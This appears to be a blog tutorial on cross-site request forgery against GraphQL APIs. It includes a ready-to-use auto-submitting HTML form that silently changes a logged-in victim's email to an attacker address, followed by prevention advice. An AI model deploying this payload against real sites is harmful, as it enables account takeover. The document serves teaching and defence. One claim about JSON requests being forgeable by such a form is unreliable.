# How to Perform CSRF Attack in GraphQL API

> tags: graphql, csrf, web-security, attack-techniques

![Image](https://miro.medium.com/v2/resize:fit:720/format:webp/1*wC-DXA3AeudCKD1k5WhH1w.png)

---

## Introduction

Hello hackers! 🕶️

Today we are going to explore how to perform a **CSRF (Cross-Site Request Forgery)** attack against a **GraphQL API**.

Many developers believe GraphQL is safe from CSRF just because it uses POST requests. But that's **not true**.

Let’s see how it can still be exploited when protections are not properly implemented.

---

## What is CSRF?

**Cross-Site Request Forgery** is an attack that tricks a victim into submitting an unwanted request to a web application where they're already authenticated.

In the context of **GraphQL**, it’s common to assume safety due to usage of POST, but the truth is:

* If the GraphQL endpoint accepts `application/x-www-form-urlencoded` or `application/json` content-type
* And there’s no CSRF protection (like SameSite cookies or CSRF tokens)

…it becomes vulnerable.

---

## CSRF with GraphQL Example

Assume the vulnerable GraphQL mutation is:

```graphql
mutation {
  updateEmail(email: "attacker@evil.com")
}
```

This mutation **changes the email of the logged-in user**. If the endpoint accepts requests with the cookie session and no CSRF protection, an attacker can create this malicious HTML:

```html
<html>
  <body>
    <form action="https://target.com/graphql" method="POST">
      <input type="hidden" name="query" value='mutation { updateEmail(email: "attacker@evil.com") }'>
      <input type="submit" value="Submit">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Once the victim is logged in and visits the attacker’s page, **the email gets changed** silently.

---

## Why Does This Work?

* **GraphQL often lacks CSRF protection**
* If the GraphQL endpoint allows `application/x-www-form-urlencoded` and uses cookies for session
* The browser sends session cookies automatically

So even though it's a POST request, it can be exploited like a regular CSRF attack.

---

## How to Prevent CSRF in GraphQL

1. **Enforce SameSite cookies**

   ```http
   Set-Cookie: sessionid=xyz; SameSite=Strict; Secure
   ```

2. **Reject `application/x-www-form-urlencoded`**

   Accept only `application/json` content-type and **reject browser-friendly formats**.

3. **Use CSRF tokens**

   Even with GraphQL, you can implement CSRF tokens and validate them server-side.

4. **Add origin/referrer checks**

   Validate that the incoming requests come from the same origin.

---

## Conclusion

* GraphQL is not inherently safe from CSRF.
* Any state-changing mutation can be a target.
* Always implement proper CSRF defenses like SameSite cookies and token-based protection.

Thanks for reading, stay safe and hack smart 🧠💥

---
